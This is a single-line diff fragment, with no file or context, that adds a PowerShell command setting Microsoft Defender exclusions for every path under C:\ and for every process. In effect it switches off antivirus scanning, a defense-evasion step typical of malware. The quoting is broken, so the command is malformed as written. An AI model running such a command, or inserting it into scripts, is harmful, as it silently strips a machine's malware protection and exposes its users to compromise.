@@ -1,0 +1,1 @@
+Set-MpPreference -ExclusionPath " C:\*\; Set-MpPreference -ExclusionProcess \*\
